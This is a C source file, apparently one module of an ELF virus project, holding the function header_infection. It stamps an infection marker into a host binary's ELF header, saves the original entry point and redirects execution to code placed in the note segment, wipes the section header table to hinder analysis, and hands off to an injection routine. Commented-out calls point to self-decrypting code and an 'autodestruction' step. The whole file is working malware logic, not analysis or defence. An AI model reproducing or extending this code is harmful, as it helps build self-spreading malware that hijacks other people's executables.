#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

#if DEBUG
	MID_TRACER("header_infection:\t");
#endif

	if (context == FAILURE)
		goto label;

	*(unsigned int *)&host->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	host->entry[OLD] = host->header->e_entry;
	host->header->e_entry = host->segment[NOTE]->p_vaddr;
	host->entry[NEW] = host->header->e_entry;

	host->header->e_shoff = 0;
	host->header->e_shnum = 0;
	host->header->e_shstrndx = 0;

label:
//	update_keychain_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
//	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

	injection(host, keychain, context);
}
